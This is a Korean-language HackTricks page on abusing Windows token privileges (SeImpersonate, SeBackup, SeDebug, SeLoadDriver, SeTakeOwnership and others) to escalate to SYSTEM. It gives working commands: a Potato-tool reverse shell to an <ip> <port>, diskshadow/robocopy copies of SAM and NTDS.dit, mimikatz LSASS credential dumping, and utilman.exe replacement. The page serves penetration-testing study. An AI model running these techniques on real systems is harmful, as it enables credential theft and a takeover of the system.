# Tokens 악용

{{#include ../../banners/hacktricks-training.md}}

## Tokens

**Windows Access Tokens**가 무엇인지 모른다면 계속하기 전에 이 페이지를 읽으세요:


{{#ref}}
access-tokens.md
{{#endref}}

**이미 보유한 tokens를 악용해 권한을 상승시킬 수 있습니다.**

### SeImpersonatePrivilege

이 권한을 사용하면 프로세스가 token에 대한 핸들을 얻을 수 있을 때 해당 token을 impersonate할 수 있습니다(생성할 수는 없음). Windows 서비스(DCOM)가 exploit을 대상으로 NTLM 인증을 수행하도록 유도하면 권한이 있는 token을 획득할 수 있으며, 이를 통해 SYSTEM 권한으로 프로세스를 실행할 수 있습니다.<sup>[[2]](#references)</sup> 이 기법은 [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM)(WinRM이 비활성화되어 있어야 함), [SweetPotato](https://github.com/CCob/SweetPotato), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) 등의 도구로 악용할 수 있습니다.

로컬 사용자가 더 높은 권한의 identity로 호출자가 선택한 URL에 요청을 보내는 인증된 endpoint에 접근할 수 있다면, loopback 전용 웹 애플리케이션도 별도의 coercion 단서가 될 수 있습니다. endpoint의 권한 부여 및 URL 제한, 실제 outbound client identity와 인증 동작, 그리고 해당 client가 낮은 권한의 사용자가 제어하는 listener에 접근할 수 있는지 확인하세요. `SeImpersonatePrivilege`가 활성화되어 있거나, IIS listener가 있거나, URL-fetch parameter가 있다는 사실만으로 권한이 있는 token이나 권한 상승 경로가 성립하는 것은 아닙니다. 이 검토는 수동적으로 수행하세요. enumeration 중에는 coercion 요청을 보내지 마세요. Microsoft의 [client impersonation](https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation) 및 [IIS application-pool identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) 문서를 참고하세요.

최신 operator 참고 사항:

- **JuicyPotato는 구형 도구입니다**: Windows 10 1809+/Server 2019+에서는 어떤 RPC/COM surface에 여전히 접근할 수 있는지에 따라 **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato**, 또는 **PrintSpoofer**를 우선 사용하세요.
- **`LOCAL SERVICE`** 또는 **`NETWORK SERVICE`**로 실행되는 서비스를 침해했고 `whoami /priv`에 `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`가 없는 **filtered token**이 표시된다면, 먼저 해당 계정의 **default privilege set**을 복구한 다음(예: **FullPowers** 사용) potato 계열 도구를 다시 시도하세요.<sup>[[3]](#references)</sup>
- 최신 fork 중에는 원본 도구보다 operator가 사용하기 편한 것도 있습니다. 예를 들어 **SigmaPotato**는 reflection/in-memory execution 및 최신 Windows 호환성을 지원하고, **PrintNotifyPotato**는 PrintNotify COM service를 악용하며 기존 Spooler 경로가 비활성화된 경우 유용할 때가 많습니다.

```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

**SeImpersonatePrivilege**와 매우 유사하며, **같은 방법**으로 권한이 높은 token을 획득합니다.\
이 privilege를 사용하면 새 프로세스 또는 일시 중단된 프로세스에 **primary token을 할당**할 수 있습니다. 권한이 있는 impersonation token으로 primary token을 파생할 수 있습니다(DuplicateTokenEx).\
이 token을 사용해 'CreateProcessAsUser'로 **새 프로세스**를 만들거나, 프로세스를 일시 중단 상태로 생성한 다음 **token을 설정**할 수 있습니다(일반적으로 실행 중인 프로세스의 primary token은 수정할 수 없습니다).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

이 token을 활성화하면 **KERB_S4U_LOGON**을 사용해 자격 증명을 몰라도 다른 사용자의 **impersonation token**을 얻고, token에 **임의의 그룹**(admins)을 추가하고, token의 **무결성 수준**을 "**medium**"으로 설정한 뒤, 이 token을 **현재 스레드**에 할당할 수 있습니다(SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

이 privilege는 시스템이 모든 파일에 대한 **읽기 액세스 권한**을 부여하도록 합니다(읽기 작업으로 제한됨). 이 privilege는 레지스트리에서 로컬 Administrator 계정의 **password hash를 읽는 데** 사용되며, 이후 "**psexec**" 또는 "**wmiexec**" 같은 도구를 hash와 함께 사용할 수 있습니다(Pass-the-Hash technique). 하지만 다음 두 가지 경우에는 이 technique이 작동하지 않습니다. Local Administrator 계정이 비활성화되어 있거나, 원격으로 연결하는 Local Administrator의 관리자 권한을 제거하는 policy가 적용된 경우입니다.<sup>[[2]](#references)</sup>\
실제로 가장 신뢰할 수 있는 기본 제공 절차는 보통 **VSS + `robocopy /b`**입니다. shadow copy를 생성하거나 노출한 다음, **backup mode**로 `SAM`/`SYSTEM` 또는 `NTDS.dit`를 복사하면 파일 ACL을 우회할 수 있습니다.<sup>[[4]](#references)</sup>

```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```

다음과 같이 **이 권한을 악용**할 수 있습니다.

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)에서 **IppSec**을 따라 하기
- 또는 다음 문서의 **Backup Operators를 이용한 권한 상승** 섹션에 설명된 방법을 사용할 수 있습니다.


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

이 권한은 파일의 ACL(Access Control List)과 관계없이 모든 시스템 파일에 대한 **쓰기 액세스 권한**을 제공합니다. 이를 통해 **서비스 수정**, DLL Hijacking, Image File Execution Options를 통한 **debugger 설정** 등 다양한 권한 상승 기법을 사용할 수 있습니다.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege는 강력한 권한으로, 사용자가 토큰을 가장할 수 있을 때 특히 유용하며 SeImpersonatePrivilege가 없는 경우에도 활용할 수 있습니다. 이 기능을 사용하려면 현재 프로세스와 동일한 사용자를 나타내고 무결성 수준이 현재 프로세스보다 높지 않은 토큰을 가장할 수 있어야 합니다.<sup>[[2]](#references)</sup>

**핵심 사항:**

- **SeImpersonatePrivilege 없이 가장:** 특정 조건에서 SeCreateTokenPrivilege를 이용해 토큰을 가장하여 EoP를 수행할 수 있습니다.
- **토큰 가장 조건:** 가장에 성공하려면 대상 토큰이 동일한 사용자에 속해야 하며, 가장을 시도하는 프로세스와 같거나 낮은 무결성 수준을 가져야 합니다.
- **가장 토큰 생성 및 수정:** 사용자는 가장 토큰을 생성한 다음 권한이 있는 그룹의 SID(Security Identifier)를 추가해 권한을 높일 수 있습니다.

### SeLoadDriverPrivilege

이 권한을 사용하면 특정 `ImagePath` 및 `Type` 값을 사용해 레지스트리 항목을 생성하여 프로세스가 **디바이스 드라이버를 로드 및 언로드**할 수 있습니다. `HKLM` (HKEY_LOCAL_MACHINE)에 직접 쓰는 것은 제한되므로 대신 `HKCU` (HKEY_CURRENT_USER)를 사용할 수 있습니다. 단, `HKCU` 항목이 커널에서 드라이버 구성으로 인식되도록 하려면 특정 경로를 사용해야 합니다.<sup>[[2]](#references)</sup>

최근 공격에서 주로 사용하는 방식은 **BYOVD** (bring your own vulnerable driver)입니다. 즉, **서명되었지만 취약한** 커널 드라이버를 로드한 다음 IOCTL을 사용해 보호 기능을 비활성화하거나 커널 코드 실행으로 이어지는 것입니다. 최근 Windows 11/Server 빌드에서는 **Microsoft vulnerable driver blocklist** 및/또는 **HVCI/Memory Integrity**로 인해 오래된 공개 체인이 작동하지 않는 경우가 많습니다. 따라서 `szkg64.sys`와 같은 고전적인 예제가 더는 모든 환경에서 안정적으로 작동하지 않을 수 있습니다.

경로는 `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`이며, 여기서 `<RID>`는 현재 사용자의 Relative Identifier입니다. `HKCU` 아래에 이 전체 경로를 생성하고 다음 두 값을 설정해야 합니다.<sup>[[2]](#references)</sup>

- `ImagePath`: 실행할 바이너리의 경로
- `Type`: `SERVICE_KERNEL_DRIVER` (`0x00000001`) 값

**절차:**

1. 쓰기 액세스가 제한되어 있으므로 `HKLM` 대신 `HKCU`에 접근합니다.
2. `<RID>`가 현재 사용자의 Relative Identifier를 나타내도록 `HKCU`에 `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` 경로를 생성합니다.
3. `ImagePath`를 바이너리의 실행 경로로 설정합니다.
4. `Type`을 `SERVICE_KERNEL_DRIVER` (`0x00000001`)로 설정합니다.

```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```

이 권한을 악용하는 다른 방법은 [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)에서 확인할 수 있습니다.

### SeTakeOwnershipPrivilege

이 권한은 **SeRestorePrivilege**와 비슷합니다. 주된 기능은 프로세스가 **객체의 소유권을 획득하도록** 허용해 WRITE_OWNER 액세스 권한을 부여함으로써 명시적인 재량 액세스 요건을 우회하는 것입니다. 이 과정에서는 먼저 대상 레지스트리 키의 소유권을 확보해 쓰기 권한을 얻은 다음, 쓰기 작업을 허용하도록 DACL을 변경합니다.<sup>[[2]](#references)</sup>

```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```

### SeDebugPrivilege

이 권한을 사용하면 **다른 프로세스를 디버깅**할 수 있으며, 메모리를 읽고 쓸 수도 있습니다. 이 권한으로 메모리 인젝션을 위한 다양한 전략을 사용할 수 있으며, 이러한 전략은 대부분의 안티바이러스 및 호스트 침입 방지 솔루션을 회피할 수 있습니다.<sup>[[2]](#references)</sup>

최신 Windows에서는 `SeDebugPrivilege`만으로 **보호되지 않는 SYSTEM 프로세스**를 열고 해당 프로세스의 토큰을 복제하기에 충분한 경우가 많지만, **LSASS**에 접근할 수 있다는 보장은 아닙니다. **RunAsPPL / LSA Protection**이 활성화되어 있으면 `SeDebugPrivilege`가 있더라도 보호되지 않는 프로세스는 LSASS를 읽거나 인젝션할 수 없습니다. 이 경우 다른 비 PPL SYSTEM 프로세스에서 토큰을 훔치거나, `procdump`가 작동할 것이라고 가정하는 대신 PPL 우회/BYOVD와 연계하세요. `SeDebugPrivilege` + `SeImpersonatePrivilege`를 사용하는 전체 토큰 복사 예제는 [이 페이지](sedebug-+-seimpersonate-copy-token.md)를 확인하세요.

#### 메모리 덤프

[SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)의 [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)를 사용해 **프로세스 메모리를 캡처**할 수 있습니다. 특히 사용자 인증 정보를 저장하는 **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)** 프로세스에 이 방법을 적용할 수 있습니다. 사용자 인증 정보는 사용자가 시스템에 성공적으로 로그인하면 저장됩니다.

그런 다음 이 덤프를 mimikatz에 로드해 비밀번호를 얻을 수 있습니다:

```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

이전에 저장된 읽을 수 있는 LSASS dump가 있을 수 있으며, 현재 계정에 실행 중인 보호 프로세스를 캡처할 권한이 없어도 접근할 수 있습니다. dump 파일이나 비슷한 이름의 아카이브는 단서로만 취급하세요. 먼저 접근 권한과 내용을 확인한 다음, 복구한 자격 증명이 여전히 유효하고 더 높은 권한의 컨텍스트를 제공하는지 평가하세요. 파일 이름만으로는 아카이브에 dump가 들어 있거나 자격 증명을 재사용할 수 있다는 점을 입증할 수 없습니다.

#### RCE

`NT SYSTEM` shell을 얻으려면 다음을 사용할 수 있습니다.

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)

```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```

### SeManageVolumePrivilege

이 권한(볼륨 유지 관리 작업 수행)은 권한이 필요한 볼륨 작업을 지원할 수 있지만, 읽을 수 있는 raw-volume 핸들이나 임의의 파일 접근을 그 자체로 보장하지는 않습니다. 장치 ACL, 토큰 상태, Windows 버전, 요청된 작업도 여전히 영향을 줍니다. 허용된 볼륨 제어 작업은 대신 파일 시스템 ACL을 변경할 수 있으며, 이는 볼륨 전체에 영향을 줄 수 있는 변경 작업입니다. CA 호스트에서 인증서 악용을 하려면 사용 가능한 개인 키 자료에 접근할 수 있어야 하며, EFS로 보호된 파일에는 여전히 승인된 복호화 키 또는 복구 키가 필요합니다. 자세한 사전 조건은 아래를 참조하세요.<sup>[[5]](#references)</sup>

자세한 기법 및 완화 방법은 다음을 참조하세요.

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## 권한 확인

```
whoami /priv
```

**Disabled**로 표시된 token은 보통 활성화할 수 있으므로, _Enabled_ 및 _Disabled_ 권한을 모두 악용할 수 있는 경우가 많습니다.

### 모든 token 활성화

비활성화된 권한이 있다면, 스크립트 [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)를 사용해 모든 token을 활성화할 수 있습니다:

```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```

또는 이 [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/)에 포함된 **script**를 사용하세요.

## Table

전체 token privileges cheatsheet는 [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)에 있습니다. 아래 요약에는 해당 privilege를 악용해 admin 세션을 얻거나 민감한 파일을 읽는 직접적인 방법만 나열합니다.<sup>[[1]](#references)</sup>

| Privilege                  | 영향        | 도구                    | 실행 경로                                                                                                                                                                                                                                                                                                                                     | 참고 사항                                                                                                                                                                                                                                                                                                                       |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"사용자가 token을 impersonate하고 potato.exe, rottenpotato.exe, juicypotato.exe 같은 도구를 사용해 nt system으로 privesc할 수 있습니다."_                                                                                                                                                                                                      | 업데이트를 알려주신 [Aurélien Chalot](https://twitter.com/Defte_)에게 감사드립니다. 곧 더 따라 하기 쉬운 형태로 다시 작성해 보겠습니다.                                                                                                                                                                                         |
| **`SeBackup`**             | **위협**    | _**기본 제공 명령**_    | `robocopy /b` 또는 SeBackup을 지원하는 전용 복사 도구를 사용해 민감한 파일을 읽습니다.                                                                                                                                                                                                                                                                 | <p>- `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` 및 경우에 따라 `%WINDIR%\MEMORY.DMP`에 유용합니다.<br><br>- `robocopy`를 사용하면 편리하지만, 잠겨 있거나 열려 있는 파일에는 전용 SeBackup cmdlet/API가 더 유연한 경우가 많습니다.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | `NtCreateToken`으로 로컬 admin 권한을 포함한 임의의 token을 생성합니다.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | **PPL이 아닌** SYSTEM token을 복제하거나 보호되지 않은 프로세스의 메모리를 덤프합니다.                                                                                                                                                                                                                                                                 | <p>RunAsPPL/LSA Protection이 활성화되어 있으면 LSASS 덤프는 흔히 차단됩니다.</p><p>스크립트는 [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)에서 찾을 수 있습니다.</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | **Potato family** / named-pipe impersonation을 사용해 SYSTEM으로 프로세스를 실행합니다(`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato` 등).                                                                                                                                                                                    | <p>IIS APPPOOL, MSSQL 같은 서비스 계정, scheduled task 또는 이미 `SeImpersonatePrivilege`를 보유한 컨텍스트에서 가장 실용적입니다.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. 서명되었지만 취약한 kernel driver를 로드합니다(BYOVD).<br>2. 해당 driver의 IOCTL을 사용해 kernel R/W를 얻거나, 보안 도구를 비활성화하거나, SYSTEM으로 권한을 상승시킵니다.<br><br>또는 이 privilege를 사용해 기본 제공 명령인 <code>fltMC</code>로 보안 관련 driver를 언로드할 수 있습니다. 예: <code>fltMC sysmondrv</code></p>                     | <p><code>szkg64.sys</code> 같은 오래된 공개 driver는 취약 driver 차단 목록/HVCI로 인해 최신 Windows에서 점점 더 많이 차단됩니다.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. SeRestore privilege가 있는 PowerShell/ISE를 실행합니다.<br>2. <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>)로 privilege를 활성화합니다.<br>3. utilman.exe의 이름을 utilman.old로 변경합니다.<br>4. cmd.exe의 이름을 utilman.exe로 변경합니다.<br>5. 콘솔을 잠그고 Win+U를 누릅니다.</p> | <p>일부 AV software가 공격을 탐지할 수 있습니다.</p><p>같은 privilege를 사용해 "Program Files"에 저장된 service binary를 교체하는 대체 방법도 있습니다.</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**기본 제공 명령**_    | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. cmd.exe의 이름을 utilman.exe로 변경합니다.<br>4. 콘솔을 잠그고 Win+U를 누릅니다.</p>                                                                                                                                       | <p>일부 AV software가 공격을 탐지할 수 있습니다.</p><p>같은 privilege를 사용해 "Program Files"에 저장된 service binary를 교체하는 대체 방법도 있습니다.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>token을 조작해 로컬 admin 권한을 포함시킵니다. SeImpersonate가 필요할 수 있습니다.</p><p>검증 필요.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - Windows privilege에서 admin까지의 악용 경로](https://github.com/gtworek/Priv2Admin)
- [2] [LPE를 위한 Token Privileges 악용](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – 내 Privileges를 돌려줘요! 제발요?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (`/b` 백업 모드는 파일/폴더 ACL 검사를 우회)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – 볼륨 유지 관리 작업 수행 (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key 유출 → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
